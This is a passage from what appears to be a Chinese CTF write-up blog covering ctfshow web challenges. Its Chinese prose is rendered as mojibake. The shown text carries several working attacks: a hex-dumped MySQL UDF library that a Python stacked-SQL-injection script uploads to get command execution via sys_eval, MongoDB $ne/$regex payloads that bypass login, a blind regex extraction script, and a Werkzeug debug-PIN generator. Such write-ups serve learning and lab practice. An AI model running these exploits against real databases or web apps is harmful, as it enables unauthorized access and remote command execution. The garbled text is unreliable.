800000002000B00200B0000000000000000000000000000110000000400F1FF000000000000000000000000000000008400000001001000D01420000000000000000000000000009100000001000F00C01400000000000000000000000000009F00000001001200E8142000000000000000000000000000AB00000002000B0010110000000000000000000000000000C10000000400F1FF00000000000000000000000000000000D40000000100F1FF90162000000000000000000000000000EA00000001001300F0142000000000000000000000000000F700000001001100E0142000000000000000000000000000040100000100F1FFF81420000000000000000000000000000D01000012000B00D10D000000000000D1000000000000001501000012000B00130F0000000000002F000000000000001E01000020000000000000000000000000000000000000002D01000020000000000000000000000000000000000000004101000012000C00481100000000000000000000000000004701000012000B00A90F0000000000000A000000000000005701000012000000000000000000000000000000000000006B01000012000000000000000000000000000000000000007F01000012000B00A20E00000000000067000000000000008D01000012000B00B30F0000000000005501000000000000960100001200000000000000000000000000000000000000A901000012000B00950B0000000000000A00000000000000C601000012000B00B50C000000000000F100000000000000D30100001200000000000000000000000000000000000000E50100001200000000000000000000000000000000000000F901000012000000000000000000000000000000000000000D02000012000B004C0B00000000000049000000000000002802000022000000000000000000000000000000000000004402000012000B00A60D0000000000002B000000000000005302000012000B00EB0B0000000000005D000000000000006002000012000B00480C0000000000000A000000000000006F02000012000000000000000000000000000000000000008302000012000B00420F0000000000006700000000000000910200001200000000000000000000000000000000000000A50200001200000000000000000000000000000000000000B902000012000B00520C0000000000006300000000000000C10200001000F1FF10172000000000000000000000000000CD02000012000B009F0B0000000000004C00000000000000E30200001000F1FF20172000000000000000000000000000E80200001200000000000000000000000000000000000000FD02000012000B00090F0000000000000A000000000000000D0300001200000000000000000000000000000000000000220300001000F1FF101720000000000000000000000000002903000012000000000000000000000000000000000000003C03000012000900880900000000000000000000000000000063616C6C5F676D6F6E5F73746172740063727473747566662E63005F5F43544F525F4C4953545F5F005F5F44544F525F4C4953545F5F005F5F4A43525F4C4953545F5F005F5F646F5F676C6F62616C5F64746F72735F61757800636F6D706C657465642E363335320064746F725F6964782E36333534006672616D655F64756D6D79005F5F43544F525F454E445F5F005F5F4652414D455F454E445F5F005F5F4A43525F454E445F5F005F5F646F5F676C6F62616C5F63746F72735F617578006C69625F6D7973716C7564665F7379732E63005F474C4F42414C5F4F46465345545F5441424C455F005F5F64736F5F68616E646C65005F5F44544F525F454E445F5F005F44594E414D4943007379735F736574007379735F65786563005F5F676D6F6E5F73746172745F5F005F4A765F5265676973746572436C6173736573005F66696E69007379735F6576616C5F6465696E6974006D616C6C6F634040474C4942435F322E322E350073797374656D4040474C4942435F322E322E35007379735F657865635F696E6974007379735F6576616C0066676574734040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F6465696E6974007379735F7365745F696E697400667265654040474C4942435F322E322E35007374726C656E4040474C4942435F322E322E350070636C6F73654040474C4942435F322E322E35006C69625F6D7973716C7564665F7379735F696E666F5F696E6974005F5F6378615F66696E616C697A654040474C4942435F322E322E35007379735F7365745F6465696E6974007379735F6765745F696E6974007379735F6765745F6465696E6974006D656D6370794040474C4942435F322E322E35007379735F6576616C5F696E697400736574656E764040474C4942435F322E322E3500676574656E764040474C4942435F322E322E35007379735F676574005F5F6273735F7374617274006C69625F6D7973716C7564665F7379735F696E666F005F656E64007374726E6370794040474C4942435F322E322E35007379735F657865635F6465696E6974007265616C6C6F634040474C4942435F322E322E35005F656461746100706F70656E4040474C4942435F322E322E35005F696E697400&quot;for i in range(0,21510, 5000):    end &#x3D; i + 5000    payload.append(udf[i:end])p &#x3D; dict(zip(text, payload))for t in text:    url &#x3D; base_url+&quot;?id&#x3D;&#39;;select unhex(&#39;&#123;&#125;&#39;) into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;&#123;&#125;.txt&#39;--+&amp;page&#x3D;1&amp;limit&#x3D;10&quot;.format(p[t], t)    r &#x3D; requests.get(url)    print(r.status_code)next_url &#x3D; base_url+&quot;?id&#x3D;&#39;;select concat(load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;a.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;b.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;c.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;d.txt&#39;),load_file(&#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;e.txt&#39;)) into dumpfile &#39;&#x2F;usr&#x2F;lib&#x2F;mariadb&#x2F;plugin&#x2F;udf.so&#39;--+&amp;page&#x3D;1&amp;limit&#x3D;10&quot;rn &#x3D; requests.get(next_url)uaf_url&#x3D;base_url+&quot;?id&#x3D;&#39;;CREATE FUNCTION sys_eval RETURNS STRING SONAME &#39;udf.so&#39;;--+&quot;#å¯¼å…¥udfå‡½æ•°r&#x3D;requests.get(uaf_url)nn_url &#x3D; base_url+&quot;?id&#x3D;&#39;;select sys_eval(&#39;cat &#x2F;flag.*&#39;);--+&amp;page&#x3D;1&amp;limit&#x3D;10&quot;rnn &#x3D; requests.get(nn_url)print(rnn.text)</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220512180600048.png" alt="image-20220512180600048"></p><h2 id="web249"><a href="#web249" class="headerlink" title="web249"></a>web249</h2><p>sqlè¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ— $user &#x3D; $memcache-&gt;get($id);    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ— è¿‡æ»¤</code></pre><p>nosqlçš„æ³¨å…¥</p><p><a href="http://rui0.cn/archives/609">NoSQLæ³¨å…¥å°ç¬”è®° - Ruilin (rui0.cn)</a></p><p><a href="https://www.anquanke.com/post/id/97211#h2-0">https://www.anquanke.com/post/id/97211#h2-0</a></p><blockquote><h4 id="NoSQLç›¸å…³çš„SQLæ”»å‡»"><a href="#NoSQLç›¸å…³çš„SQLæ”»å‡»" class="headerlink" title="NoSQLç›¸å…³çš„SQLæ”»å‡»:"></a>NoSQLç›¸å…³çš„SQLæ”»å‡»:</h4><p>1.<strong>é‡è¨€å¼</strong>ã€‚åˆç§°ä¸ºæ°¸çœŸå¼ã€‚æ­¤ç±»æ”»å‡»æ˜¯åœ¨æ¡ä»¶è¯­å¥ä¸­æ³¨å…¥ä»£ç ,ä½¿ç”Ÿæˆçš„è¡¨è¾¾å¼åˆ¤å®šç»“æœæ°¸è¿œä¸ºçœŸ,ä»è€Œç»•è¿‡è®¤è¯æˆ–è®¿é—®æœºåˆ¶ã€‚æ¯”å¦‚å®é™…ä¸­ç”¨$neæ“ä½œ(ä¸ç›¸ç­‰)çš„è¯­æ³•è®©ä»–ä»¬æ— éœ€ç›¸åº”çš„å‡­è¯å³å¯éæ³•è¿›å…¥ç³»ç»Ÿã€‚</p><p>2.<strong>è”åˆæŸ¥è¯¢</strong>ã€‚è”åˆæŸ¥è¯¢æ˜¯ä¸€ç§ä¼—æ‰€å‘¨çŸ¥çš„SQLæ³¨å…¥æŠ€æœ¯,æ”»å‡»è€…åˆ©ç”¨ä¸€ä¸ªè„†å¼±çš„å‚æ•°å»æ”¹å˜ç»™å®šæŸ¥è¯¢è¿”å›çš„æ•°æ®é›†ã€‚è”åˆæŸ¥è¯¢æœ€å¸¸ç”¨çš„ç”¨æ³•æ˜¯ç»•è¿‡è®¤è¯é¡µé¢è·å–æ•°æ®ã€‚æ¯”å¦‚é€šè¿‡å¢åŠ æ°¸çœŸçš„è¡¨è¾¾å¼åˆ©ç”¨å¸ƒå°”ORè¿ç®—ç¬¦è¿›è¡Œæ”»å‡»,ä»è€Œå¯¼è‡´æ•´ä¸ªè¯­å¥åˆ¤å®šå‡ºé”™,è¿›è¡Œéæ³•çš„æ•°æ®è·å–ã€‚</p><p>3.<strong>JavaScriptæ³¨å…¥</strong>ã€‚è¿™æ˜¯ä¸€ç§æ–°çš„æ¼æ´,ç”±å…è®¸æ‰§è¡Œæ•°æ®å†…å®¹ä¸­JavaScriptçš„NoSQLæ•°æ®åº“å¼•å…¥çš„ã€‚JavaScriptä½¿åœ¨æ•°æ®å¼•æ“è¿›è¡Œå¤æ‚äº‹åŠ¡å’ŒæŸ¥è¯¢æˆä¸ºå¯èƒ½ã€‚ä¼ é€’ä¸å¹²å‡€çš„ç”¨æˆ·è¾“å…¥åˆ°è¿™äº›æŸ¥è¯¢ä¸­å¯ä»¥æ³¨å…¥ä»»æ„JavaScriptä»£ç ,è¿™ä¼šå¯¼è‡´éæ³•çš„æ•°æ®è·å–æˆ–ç¯¡æ”¹ã€‚</p><p>4.<strong>èƒŒè´Ÿå¼æŸ¥è¯¢</strong>ã€‚åœ¨èƒŒè´Ÿå¼æŸ¥è¯¢ä¸­,æ”»å‡»è€…é€šè¿‡åˆ©ç”¨è½¬ä¹‰ç‰¹å®šå­—ç¬¦(æ¯”å¦‚åƒå›è½¦å’Œæ¢è¡Œä¹‹ç±»çš„ç»“æŸç¬¦)æ’å…¥ç”±æ•°æ®åº“é¢å¤–æ‰§è¡Œçš„æŸ¥è¯¢,è¿™æ ·å°±å¯ä»¥æ‰§è¡Œä»»æ„ä»£ç äº†ã€‚</p><p>5.<strong>è·¨åŸŸè¿è§„</strong>ã€‚HTTP REST APIsæ˜¯NoSQLæ•°æ®åº“ä¸­çš„ä¸€ä¸ªæµè¡Œæ¨¡å—,ç„¶è€Œ,å®ƒä»¬å¼•å…¥äº†ä¸€ç±»æ–°çš„æ¼æ´,å®ƒç”šè‡³èƒ½è®©æ”»å‡»è€…ä»å…¶ä»–åŸŸæ”»å‡»æ•°æ®åº“ã€‚åœ¨è·¨åŸŸæ”»å‡»ä¸­,æ”»å‡»è€…åˆ©ç”¨åˆæ³•ç”¨æˆ·å’Œä»–ä»¬çš„ç½‘é¡µæµè§ˆå™¨æ‰§è¡Œæœ‰å®³çš„æ“ä½œã€‚åœ¨æœ¬æ–‡ä¸­,æˆ‘ä»¬å°†å±•ç¤ºæ­¤ç±»è·¨ç«™è¯·æ±‚ä¼ªé€ (CSRF)æ”»å‡»å½¢å¼çš„è¿è§„è¡Œä¸º,åœ¨æ­¤ç½‘ç«™ä¿¡ä»»çš„ç”¨æˆ·æµè§ˆå™¨å°†è¢«åˆ©ç”¨åœ¨NoSQLæ•°æ®åº“ä¸Šæ‰§è¡Œéæ³•æ“ä½œã€‚é€šè¿‡æŠŠHTMLæ ¼å¼çš„ä»£ç æ³¨å…¥åˆ°æœ‰æ¼æ´çš„ç½‘ç«™æˆ–è€…æ¬ºéª—ç”¨æˆ·è¿›å…¥åˆ°æ”»å‡»è€…è‡ªå·±çš„ç½‘ç«™ä¸Š,æ”»å‡»è€…å¯ä»¥åœ¨ç›®æ ‡æ•°æ®åº“ä¸Šæ‰§è¡ŒpoståŠ¨ä½œ,ä»è€Œç ´åæ•°æ®åº“ã€‚</p><h4 id="NoSQL-MYSQLåŒºåˆ«ï¼š"><a href="#NoSQL-MYSQLåŒºåˆ«ï¼š" class="headerlink" title="NoSQL MYSQLåŒºåˆ«ï¼š"></a>NoSQL MYSQLåŒºåˆ«ï¼š</h4><p>nosqlçš„å®šä¹‰æ˜¯not only sqlï¼ŒåŒ…æ‹¬é”®å€¼æ•°æ®åº“ï¼Œåˆ—å¼æ•°æ®åº“ï¼Œæ–‡æœ¬æ•°æ®åº“ï¼Œå›¾å½¢æ•°æ®åº“ç­‰</p><p>mysqlæ˜¯ä¸€ç§ä¼ ç»Ÿçš„å…³ç³»å‹æ•°æ®åº“ã€‚ å…³ç³»å‹æ•°æ®åº“ä¸€èˆ¬éƒ½å¯ä»¥é€šè¿‡sqlè¯­å¥è¿›è¡Œæ“ä½œã€‚sqlçš„è¯­æ³•ä¸€èˆ¬éµå¾ªSQL99æ ‡å‡†ï¼Œä¹Ÿå°±æ˜¯è¯´ä¸Šå±‚çš„åº”ç”¨å¯ä»¥é€šè¿‡åŒæ ·çš„sqlè¯­å¥è®¿é—®ä¸åŒçš„æ•°æ®åº“ã€‚ è€Œnosqlå¯¹sqlçš„æ”¯æŒå¹¶ä¸åƒå…³ç³»å‹æ•°æ®åº“ä¸€æ ·ã€‚ä»¥hbaseä¸ºä¾‹ï¼Œå®ƒæœ¬èº«å¹¶ä¸æ”¯æŒsqlï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡hbase shellè¿›è¡Œæ“ä½œï¼Œä¸Šå±‚åº”ç”¨å¯ä»¥é€šè¿‡hbase APIè¯»å†™æ•°æ®åº“ã€‚ä½†æ˜¯æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡hiveï¼ˆhive sqlï¼Œç±»sqlè¯­æ³•ï¼‰æ¥è®¿é—®hbaseã€‚è¿˜æœ‰ä¸€äº›hbase skinï¼ˆå¯ä»¥ç†è§£æˆhbaseå®¢æˆ·ç«¯ï¼‰ï¼Œæ”¯æŒäº†éƒ¨åˆ†sqlè¯­æ³•ä»¥æ–¹ä¾¿ç”¨æˆ·ä½¿ç”¨ï¼Œæ¯”å¦‚pheonixã€‚</p></blockquote><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220512181741192.png" alt="image-20220512181741192"></p><p>æ‰€ä»¥payloadä¸º</p><pre class="language-txt" data-language="txt"><code class="language-txt">?id[]&#x3D;flag</code></pre><h2 id="web250"><a href="#web250" class="headerlink" title="web250"></a>web250</h2><p>sqlè¯­å¥</p><pre class="language-none"><code class="language-none">$query &#x3D; new MongoDB\Driver\Query($data);$cursor &#x3D; $manager-&gt;executeQuery(&#39;ctfshow.ctfshow_user&#39;, $query)-&gt;toArray();    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ— è¿‡æ»¤if(count($cursor)&gt;0)&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;ç™»é™†æˆåŠŸ&#39;;  array_push($ret[&#39;data&#39;], $flag);&#125;</code></pre><p>è¿˜æ˜¯nosqlæ³¨å…¥</p><p>æ¡ä»¶æ“ä½œç¬¦</p><pre class="language-txt" data-language="txt"><code class="language-txt">$gt : &gt;$lt : &lt;$gte: &gt;&#x3D;$lte: &lt;&#x3D;$ne : !&#x3D;ã€&lt;&gt;$in : in$nin: not in$all: all $or:  or$not: ååŒ¹é…(1.3.3åŠä»¥ä¸Šç‰ˆæœ¬)æ¨¡ç³ŠæŸ¥è¯¢ç”¨æ­£åˆ™å¼ï¼šdb.customer.find(&#123;&#39;name&#39;: &#123;&#39;$regex&#39;:&#39;.*s.*&#39;&#125; &#125;)&#x2F;*** : èŒƒå›´æŸ¥è¯¢ &#123; &quot;age&quot; : &#123; &quot;$gte&quot; : 2 , &quot;$lte&quot; : 21&#125;&#125;* : $ne &#123; &quot;age&quot; : &#123; &quot;$ne&quot; : 23&#125;&#125;* : $lt &#123; &quot;age&quot; : &#123; &quot;$lt&quot; : 23&#125;&#125;*&#x2F;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220512185557335.png" alt="image-20220512185557335"></p><pre class="language-php" data-language="php"><code class="language-php">db-&gt;logins-&gt;find(  array(&quot;username&quot;&#x3D;&gt;(string)$_POST[&quot;username&quot;],&quot;password&quot;&#x3D;&gt;(string)$_    POST[&quot;password&quot;]));</code></pre><p>æ„é€ <code>$data = array(â€œusernameâ€ =&gt; array(&quot;$ne&quot; =&gt; 1), â€œpasswordâ€ =&gt; array(&quot;$ne&quot; =&gt; 1));</code>è¿›è¡Œç»•è¿‡</p><p>è¿˜æ˜¯ä¹‹å‰é‚£ä¸ªæ–‡ç« é‡Œé¢å†™åˆ°çš„($neæ˜¯ä¸ç›¸ç­‰çš„æ„æ€)</p><pre class="language-payload" data-language="payload"><code class="language-payload">username[$ne]&#x3D;1&amp;password[$ne]&#x3D;1æˆ–è€…åˆ©ç”¨æ­£åˆ™username[$regex]&#x3D;.&amp;password[$regex]&#x3D;.</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220512190339907.png" alt="image-20220512190339907"></p><h2 id="web251"><a href="#web251" class="headerlink" title="web251"></a>web251</h2><p>ç”¨ä¸Šä¸€é¢˜çš„å§¿åŠ¿ï¼Œå‡ºäº†adminè´¦å·çš„ç”¨æˆ·åå¯†ç ï¼š<br>å†æ”¹æˆusernameä¸ç­‰äºadminå³å¯ï¼š</p><pre class="language-none"><code class="language-none">username[$ne]&#x3D;admin&amp;password[$ne]&#x3D;1</code></pre><h2 id="web252"><a href="#web252" class="headerlink" title="web252"></a>web252</h2><p>ç›´æ¥æ­£åˆ™ï¼š</p><pre class="language-none"><code class="language-none">username[$regex]&#x3D;.*$&amp;password[$ne]&#x3D;1</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220512185920690.png" alt="image-20220512185920690"></p><p>è¿™é‡Œç™»å½•æµ‹è¯•ï¼Œè¿˜ä¼šå‘ç°æœ‰adminå’Œadmin1ï¼Œå¯ä»¥ç”¨è¿™ç§æ­£åˆ™å»æ‰è¿™ä¿©</p><pre class="language-payload" data-language="payload"><code class="language-payload">username[$regex]&#x3D;^[^admin].*$&amp;password[$ne]&#x3D;1</code></pre><h2 id="web253"><a href="#web253" class="headerlink" title="web253"></a>web253</h2><p>sqlè¯­å¥</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;sqldb.ctfshow_user.find(&#123;username:&#39;$username&#39;,password:&#39;$password&#39;&#125;).pretty()    </code></pre><p>è¿”å›é€»è¾‘</p><pre class="language-none"><code class="language-none">&#x2F;&#x2F;æ— è¿‡æ»¤if(count($cursor)&gt;0)&#123;  $ret[&#39;msg&#39;]&#x3D;&#39;ç™»é™†æˆåŠŸ&#39;;  array_push($ret[&#39;data&#39;], $flag);&#125;  </code></pre><p>ç»§ç»­<code>$regex</code>ä½†å‘ç°çŠ¶æ€ç æ˜¯<code>\u767b\u9646\u6210\u529f</code>ï¼Œæ˜¯æŸ¥è¯¢æˆåŠŸçš„Unicodeç¼–ç ï¼Œä½†å°±æ˜¯æ²¡æœ‰å›æ˜¾ã€‚æ‰€ä»¥è¿™é¢˜ç»“åˆè¿™ä¸ªçŠ¶æ€ç è¿›è¡Œç›²æ³¨</p><p>å¥—ç¥çš„è„šæœ¬</p><pre class="language-python" data-language="python"><code class="language-python">import requestsurl&#x3D;&quot;http:&#x2F;&#x2F;81040e32-f0ba-4e17-b9eb-56848ad36c4c.challenge.ctf.show:8080&#x2F;api&#x2F;&quot;letter&#x3D;&quot;-ctfshow0123456789abcdef&#123;,&#125;&quot;flag&#x3D;&quot;&quot;for i in range(1,100):    for j in letter:        payload&#x3D;&quot;^&#123;&#125;.*$&quot;.format(flag+j)        data&#x3D;&#123;            &quot;username[$regex]&quot;:&quot;flag&quot;,            &quot;password[$regex]&quot;:payload        &#125;        res&#x3D;requests.post(url,data).text        #print(res)        if r&quot;\u767b\u9646\u5931\u8d25&quot; not in res:            flag+&#x3D;j            print(flag)            break          if j&#x3D;&#x3D;&quot;&#125;&quot;:            print(flag+&quot;--OUT&quot;)            exit()</code></pre><h1 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h1><h2 id="web279"><a href="#web279" class="headerlink" title="web279"></a>web279</h2><h1 id="å¸¸ç”¨å§¿åŠ¿"><a href="#å¸¸ç”¨å§¿åŠ¿" class="headerlink" title="å¸¸ç”¨å§¿åŠ¿"></a>å¸¸ç”¨å§¿åŠ¿</h1><h2 id="web801"><a href="#web801" class="headerlink" title="web801"></a>web801</h2><p>é¢„æœŸè§£ï¼šflaskç®—pin</p><p>æ¡ä»¶: flask debugæ¨¡å¼å¼€å¯ å­˜åœ¨ä»»æ„æ–‡ä»¶è¯»å–</p><blockquote><ol><li>usernameï¼Œç”¨æˆ·å</li><li>modnameï¼Œé»˜è®¤å€¼ä¸ºflask.app</li><li>appnameï¼Œé»˜è®¤å€¼ä¸ºFlask</li><li>moddirï¼Œflaskåº“ä¸‹app.pyçš„ç»å¯¹è·¯å¾„</li><li>uuidnodeï¼Œå½“å‰ç½‘ç»œçš„macåœ°å€çš„åè¿›åˆ¶æ•°</li><li>machine_idï¼Œdockeræœºå™¨id<br><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524154547435.png" alt="image-20220524154547435"></li></ol></blockquote><blockquote><p>probably_public_bitsåŒ…å«4ä¸ªå­—æ®µï¼Œåˆ†åˆ«ä¸º<br>username<br>modname<br>getattr(app, &#39;name&#39;, app.class.name)<br>getattr(mod, &#39;file&#39;, None)</p><p>å…¶ä¸­usernameå¯¹åº”çš„å€¼ä¸ºå½“å‰ä¸»æœºçš„ç”¨æˆ·å<br>   linuxå¯ä»¥æŸ¥çœ‹/etc/passwd<br>   windowså¯ä»¥æŸ¥çœ‹C:/Usersç›®å½•<br>modnameçš„å€¼ä¸º&#39;flask.app&#39;<br>getattr(app, &#39;name&#39;, app.class.name)å¯¹åº”çš„å€¼ä¸º&#39;Flask&#39;<br>getattr(mod, &#39;file&#39;, None)å¯¹åº”çš„å€¼ä¸ºappåŒ…çš„ç»å¯¹è·¯å¾„</p><p>private_bitsåŒ…å«ä¸¤ä¸ªå­—æ®µï¼Œåˆ†åˆ«ä¸º<br>str(uuid.getnode())<br>get_machine_id()</p><p>å…¶ä¸­str(uuid.getnode())ä¸ºç½‘å¡macåœ°å€çš„åè¿›åˆ¶å€¼<br>   åœ¨inuxç³»ç»Ÿä¸‹å¾—åˆ°å­˜å‚¨ä½ç½®ä¸º/sys/class/net/ï¼ˆå¯¹åº”ç½‘å¡ï¼‰/address ä¸€èˆ¬ä¸ºeth0<br>   windowsä¸­cmdæ‰§è¡Œconfig /allæŸ¥çœ‹<br>get_machine_id()çš„å€¼ä¸ºå½“å‰æœºå™¨å”¯ä¸€çš„æœºå™¨ç <br>   å¯¹äºédockeræœºæ¯ä¸€ä¸ªæœºå™¨éƒ½ä¼šæœ‰è‡ªå·²å”¯ä¸€çš„idï¼Œlinuxçš„idä¸€èˆ¬å­˜æ”¾åœ¨/etc/machine-idæˆ–/proc/sys/kernel/random/boot_id<br>   dockeræœºåˆ™è¯»å–/proc/self/cgroupã€‚<br>   windowsçš„idåœ¨æ³¨å†Œè¡¨ä¸­ ï¼ˆHKEY_LOCAL_MACHINE-&gt;SOFTWARE-&gt;Microsoft-&gt;Cryptographyï¼‰</p></blockquote><p>å…¶ä¸­</p><p><strong>python 3.8å’Œ3.6 pinç ç”Ÿæˆæ–¹å¼ä¸åŒ</strong></p><p><strong>werkzeugç‰ˆæœ¬ä¸åŒmachine-idè·å–ä¸åŒ</strong></p><p>3.6 MD5</p><pre class="language-python" data-language="python"><code class="language-python">import hashlibimport getpassfrom flask import Flaskfrom itertools import chainimport sysimport uuidusername&#x3D;getpass.getuser() app &#x3D; Flask(__name__)modname&#x3D;getattr(app, &quot;__module__&quot;, app.__class__.__module__)mod &#x3D; sys.modules.get(modname)probably_public_bits &#x3D; [    username, #ç”¨æˆ·å ä¸€èˆ¬ä¸ºrootæˆ–è€…è¯»ä¸‹&#x2F;etc&#x2F;passwd    modname,  #ä¸€èˆ¬å›ºå®šä¸ºflask.app    getattr(app, &quot;__name__&quot;, app.__class__.__name__), #å›ºå®šï¼Œä¸€èˆ¬ä¸ºFlask    getattr(mod, &quot;__file__&quot;, None),    #flaskåº“ä¸‹app.pyçš„ç»å¯¹è·¯å¾„ï¼Œå¯ä»¥é€šè¿‡æŠ¥é”™ä¿¡æ¯å¾—åˆ°]mac &#x3D;&#39;02:42:ac:0c:ac:28&#39;.replace(&#39;:&#39;,&#39;&#39;)mac&#x3D;str(int(mac,base&#x3D;16))private_bits &#x3D; [mac, &quot;æœºå™¨ç &quot; ]h &#x3D; hashlib.md5()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit &#x3D; bit.encode(&quot;utf-8&quot;)    h.update(bit)h.update(b&quot;cookiesalt&quot;)cookie_name &#x3D; &quot;__wzd&quot; + h.hexdigest()[:20]# If we need to generate a pin we salt it a bit more so that we don&#39;t# end up with the same value and generate out 9 digitsnum&#x3D;Noneif num is None:    h.update(b&quot;pinsalt&quot;)    num &#x3D; (&quot;%09d&quot; % int(h.hexdigest(), 16))[:9]# Format the pincode in groups of digits for easier remembering if# we don&#39;t have a result yet.rv&#x3D;Noneif rv is None:    for group_size in 5, 4, 3:        if len(num) % group_size &#x3D;&#x3D; 0:            rv &#x3D; &quot;-&quot;.join(                num[x : x + group_size].rjust(group_size, &quot;0&quot;)                for x in range(0, len(num), group_size)            )            break    else:        rv &#x3D; num    print(rv)</code></pre><p>3.8 SHA1</p><pre class="language-python" data-language="python"><code class="language-python">import hashlibimport getpassfrom flask import Flaskfrom itertools import chainimport sysimport uuidimport typing as tusername&#x3D;&#39;root&#39;app &#x3D; Flask(__name__)modname&#x3D;getattr(app, &quot;__module__&quot;, t.cast(object, app).__class__.__module__)mod&#x3D;sys.modules.get(modname)mod &#x3D; getattr(mod, &quot;__file__&quot;, None)probably_public_bits &#x3D; [    username, #ç”¨æˆ·å    modname,  #ä¸€èˆ¬å›ºå®šä¸ºflask.app    getattr(app, &quot;__name__&quot;, app.__class__.__name__), #å›ºå®šï¼Œä¸€èˆ¬ä¸ºFlask    &#39;&#x2F;usr&#x2F;local&#x2F;lib&#x2F;python3.8&#x2F;site-packages&#x2F;flask&#x2F;app.py&#39;,   #ä¸»ç¨‹åºï¼ˆapp.pyï¼‰è¿è¡Œçš„ç»å¯¹è·¯å¾„]print(probably_public_bits)mac &#x3D;&#39;02:42:ac:0c:ac:28&#39;.replace(&#39;:&#39;,&#39;&#39;)mac&#x3D;str(int(mac,base&#x3D;16))private_bits &#x3D; [   mac,#macåœ°å€åè¿›åˆ¶ &quot;æœºå™¨ç &quot;     ]print(private_bits)h &#x3D; hashlib.sha1()for bit in chain(probably_public_bits, private_bits):    if not bit:        continue    if isinstance(bit, str):        bit &#x3D; bit.encode(&quot;utf-8&quot;)    h.update(bit)h.update(b&quot;cookiesalt&quot;)cookie_name &#x3D; f&quot;__wzd&#123;h.hexdigest()[:20]&#125;&quot;# If we need to generate a pin we salt it a bit more so that we don&#39;t# end up with the same value and generate out 9 digitsh.update(b&quot;pinsalt&quot;)num &#x3D; f&quot;&#123;int(h.hexdigest(), 16):09d&#125;&quot;[:9]# Format the pincode in groups of digits for easier remembering if# we don&#39;t have a result yet.rv&#x3D;Noneif rv is None:    for group_size in 5, 4, 3:        if len(num) % group_size &#x3D;&#x3D; 0:            rv &#x3D; &quot;-&quot;.join(                num[x : x + group_size].rjust(group_size, &quot;0&quot;)                for x in range(0, len(num), group_size)            )            break    else:        rv &#x3D; numprint(rv)</code></pre><p><strong>éœ€è¦å¡«çš„å€¼å°±ä¸€ä¸ªå˜åŒ–çš„åœ°æ–¹â€”æœºå™¨ç ã€‚æ—§ç‰ˆçš„åªéœ€è¦è¯»å–/proc/self/cgroupå³å¯ï¼Œä½†æ˜¯æ–°å¢éœ€è¦åœ¨å‰é¢å†æ‹¼ä¸Š/etc/machine-idæˆ–è€…/proc/sys/kernel/random/boot_idçš„å€¼</strong></p><p>æ—§ç‰ˆ</p><pre class="language-none"><code class="language-none">å…ˆä»&#x2F;proc&#x2F;self&#x2F;cgroupåˆ¤æ–­æ˜¯å¦æ˜¯dockerå®¹å™¨ï¼Œå¦‚æœæœ‰ç¬¦åˆæ¡ä»¶çš„å€¼ç›´æ¥è¿”å›valueï¼›å¦‚æœæœªåœ¨cgroupä¸­è¯»åˆ°&#x2F;docker&#x2F;åçš„å†…å®¹è¿›è¡Œä¸‹ä¸€æ­¥ï¼Œå…ˆåè¯»å–&#x2F;etc&#x2F;machine-id å’Œ boot_idä¸­çš„å€¼è¿”å›ä¸€ä¸ªæ‰€ä»¥æ­¤å¤„machine-idåº”ä¸ºdocker: cgroupä¸­ &#x2F;docker&#x2F;åçš„å†…å®¹édocker: å…ˆåè¯»å–machine-idå’Œboot_id æœ‰å€¼å³å–</code></pre><p>æ–°ç‰ˆ</p><pre class="language-txt" data-language="txt"><code class="language-txt">å…ˆä»&#x2F;etc&#x2F;machine-idå’Œ&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_idè¯»å‡ºä¸€ä¸ªå°±è·³å‡ºï¼Œç„¶åå†è¯»å–&#x2F;proc&#x2F;self&#x2F;cgroupä¸­çš„idå€¼æ‹¼æ¥æ‰€ä»¥æ­¤å¤„machine-idä¸º&#x2F;etc&#x2F;machine-id + &#x2F;proc&#x2F;self&#x2F;cgroupæˆ–&#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;random&#x2F;boot_id + &#x2F;proc&#x2F;self&#x2F;cgroup</code></pre><p>å®æ“ä¸€ä¸‹801</p><p>username</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524154520223.png" alt="image-20220524154520223"></p><p>è·¯å¾„</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524155654602.png" alt="image-20220524155654602"></p><p>macåœ°å€</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524155323058.png" alt="image-20220524155323058"></p><p>å†æ‹¿id</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524155416263.png" alt="image-20220524155416263"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ctfshow/image-20220524155504261.png" alt="image-20220524155504261"></p><p>æ‰€ä»¥æœ€åçš„æœºå™¨ç 